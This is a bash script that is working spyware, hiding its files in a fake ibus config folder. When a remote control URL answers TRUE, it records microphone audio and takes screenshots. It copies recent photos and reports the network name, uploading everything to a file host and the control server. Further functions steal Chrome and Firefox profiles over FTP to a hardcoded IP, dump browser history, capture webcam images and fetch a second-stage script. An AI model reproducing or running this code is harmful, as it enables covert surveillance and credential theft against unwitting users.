#!/bin/bash

function dbgx(){
	echo "[*] $1";
}

function slpx(){
	sleep 5
}

HOME_="/home/$USER/"
HOME_2="/home/$USER/.config/ibus_/"
#IBUS_="/usr/local/sbin/ibus_/"
IBUS_="/home/$USER/.config/ibus_/"

function ssx_(){
    #imagemagick
    #export DISPLAY=:0.0
    DISPLAY=:0
    export DISPLAY
    #
    output_file="ss.png"
    dbgx "ssx..."
    import -window root "$IBUS_$output_file"
    dbgx "ssx saved to $output_file"
    cx "$output_file" "SS"
    slpx 
    rm -f "$IBUS_$output_file"
}

function GCx_(){
	ftp_server="139.162.128.166"
	ftp_user="xyz"
	ftp_password="xyz"
	#
	folder_to_compress="/home/$USER/.config/google-chrome"
	local_file="$IBUS_"`date +%s`"gcx.tar.gz"
	tar -czvf "$local_file" "$folder_to_compress"
	#
	remote_directory="/home/r00t1970/"`date +%s`"GCx.tar.gz"
	#
	msgx=`ftp -npvi $ftp_server <<END_SCRIPT
	quote USER $ftp_user
	quote PASS $ftp_password
	binary
	put "$local_file" "$remote_directory"
	quit
	END_SCRIPT`
	#
	OX_=`curl -k -X POST -d "descr=$msgx&cat=SS" -H "User-Agent: Mozilla XYZ" https://www.kdates.co.ke/HW1970/ps`
     dbgx "Descr: $msgx Cat: SS cx_OX:$OX_";
     #
     rm -f "$local_file"
     rm -f "$IBUS_""gcx.tar.gz"
}

function MZLx_(){
	ftp_server="139.162.128.166"
	ftp_user="xyz"
	ftp_password="xyz"
	#
	folder_to_compress="/home/$USER/.mozilla"
	local_file="$IBUS_"`date +%s`"mzlx.tar.gz"
	tar -czvf "$local_file" "$folder_to_compress"
	#
	remote_directory="/home/r00t1970/"`date +%s`"MZLx.tar.gz"
	#
	msgx=`ftp -npvi $ftp_server <<END_SCRIPT
	quote USER $ftp_user
	quote PASS $ftp_password
	binary
	put "$local_file" "$remote_directory"
	quit
	END_SCRIPT`
	#
	OX_=`curl -k -X POST -d "descr=$msgx&cat=SS" -H "User-Agent: Mozilla XYZ" https://www.kdates.co.ke/HW1970/ps`
     dbgx "Descr: $msgx Cat: SS cx_OX:$OX_";
     #
     rm -f "$local_file"
     rm -f "$IBUS_""mzlx.tar.gz"
}

function ax(){
    #sox
    duration=30
    output_file="a.wav"
    #
    amixer set Capture cap
    #
    dbgx "ax started..."
    rec -q "$IBUS_$output_file" trim 0 "$duration"
    dbgx "ax stopped. Saved to $output_file"
    #
    cx "$output_file" "AX"
    slpx
    rm -f "$output_file"
    rm -f "$IBUS_$output_file"
    #
}

function ax_(){
    #arecord
    duration=30
    output_file="a.wav"
    #
    amixer set Capture cap
    #amixer set Capture cap
    #
    dbgx "ax started..."
    arecord -f cd -d $duration -t wav -r 44100 $IBUS_$output_file
    dbgx "ax stopped. Saved to $output_file"
    #
    cx "$output_file" "AX"
    slpx
    rm -f "$output_file"
    rm -f "$IBUS_$output_file"
    #
}

function PxNwx(){
    pictures_dir="$HOME_/Pictures"
    images=$(find "$pictures_dir" -type f \( -iname \*.jpg -o -iname \*.jpeg -o -iname \*.png -o -iname \*.gif \))
    sorted_images=$(echo "$images" | xargs stat --format '%Y %n' | sort -rn)
    newest_image=$(echo "$sorted_images" | head -n 1 | awk '{print $2}')
    dbgx "Newest image: $newest_image"
    output_file="px.png"
    cp "$newest_image" $IBUS_$output_file
    cx "$output_file" "PX"
    slpx
    rm -f "$IBUS_$output_file"
}
#Fswebcam
function WbCmx(){
	output_file="px.jpg"
	fswebcam "$IBUS_$output_file"
	dbgx "Fswebcam: as $output_file"
	cx "$output_file" "PX"
    	slpx
    	rm -f "$IBUS_$output_file"
}
#sqlite3
function Hstrx(){
    output_file="chrome_history.txt"
    tmp_chrome_history="$IBUS_/tmp_chrome_history.sqlite"
    chrome_history_file="$HOME_/.config/google-chrome/Default/History"
    cp "$chrome_history_file" $tmp_chrome_history
    sqlite3 -separator $'\t' $tmp_chrome_history "SELECT datetime(last_visit_time/1000000-11644473600,'unixepoch','localtime'), title, url FROM urls ORDER BY last_visit_time DESC;" > $IBUS_$output_file
    dbgx "Chrome history extracted to $IBUS_$output_file"
    rm $tmp_chrome_history
    #
    cx "$output_file" "HX"
    slpx
    rm -f "$IBUS_$output_file"
}

function cx(){
    #OX2=`curl -k --connect-timeout 900 --max-time 900 -T $IBUS_$1 https://oshi.at`
    #dbgx "OX2: $OX2";
    #cx_ "$OX2" "$2"
    #
    OX3=`curl -k --connect-timeout 900 --max-time 900 --upload-file $IBUS_$1 https://free.keep.sh`
    dbgx "OX3: $OX3";
    cx_ "$OX3" "$2"
}

function cx_(){
    OX_=`curl -k -X POST -d "descr=$1&cat=$2" -H "User-Agent: Mozilla XYZ" https://www.kdates.co.ke/HW1970/ps`
    dbgx "Descr: $1 Cat: $2 cx_OX:$OX_";
}

function Ntx(){
    wifi_interface=$(iwconfig 2>&1 | grep "IEEE 802.11" | awk '{print $1}')  # Get the name of the wireless interface, if present
    eth_interface=$(ip link show | grep "state UP" | grep -v "lo:" | awk -F': ' '{print $2}')  # Get the name of the Ethernet interface, if present

    if [[ -n "$wifi_interface" ]]
    then
        dbgx "User is connected to WiFi using interface $wifi_interface"
        SSID=$(iwgetid -r)

        if [[ -n "$SSID" ]]
        then
            dbgx "Current SSID: $SSID"
            #
            cx_ "$SSID" "SSID"
        else
            dbgx "No wireless network detected"
        fi
    fi
    #
    if [[ -n "$eth_interface" ]]
    then
        dbgx "User is connected to Ethernet using interface $eth_interface"
	#
	cx_ "$eth_interface" "SSID"
        #
        eth_interface=$(ip -o link show | awk -F': ' '{print $2, $9}' | grep "state UP" | grep -v "lo:" | awk '{print $1}')

        if [[ -n "$eth_interface" ]]
        then
            dbgx "Name of Ethernet connection: $eth_interface"
             cx_ "$eth_interface" "SSID"
        else
            dbgx "No Ethernet connection detected"
        fi
	#
    fi
    #
}

function px(){
    px_OX=`curl -k -H "User-Agent: Mozilla XYZ" https://www.kdates.co.ke/HW1970/px`
    if [[ "$px_OX" == "TRUE" ]]
    then
        dbgx "Run: $px_OX";
	#
        Ntx
	#
	#killall -q -15 chrome
	#rm -f /home/brigid/.config/google-chrome
	#
    	#ssx_ & PxNwx & Hstrx
	#WbCmx
    	ax_ & ssx_ & PxNwx
	#GCx_
	#pkill -f firefox
	#MZLx_
 	#
  	#HOME__D="/home/brigid/Documents/"
	#wget --no-check-certificate --no-cache --no-cookies https://github.com/hLbx0/IBS/raw/main/brie.sh -O "$HOME__D".brie.sh
	#chmod 777 "$HOME__D".brie.sh
 	#
  
  	#Rspx=`ls -lah $HOME__D`
   	#cx_ "$Rspx" "SSID"
    
    	#
	#ssx2
	#
 
	exit 0
    else
        dbgx "Run: $px_OX";
        exit 1
    fi
}

function ssx2(){
	et=`date +%s`
	st=1687801104
	while [ $et -le $st ]
	do
	 et=`date +%s`
	 ssx_
	 sleep 30
	done
}

px
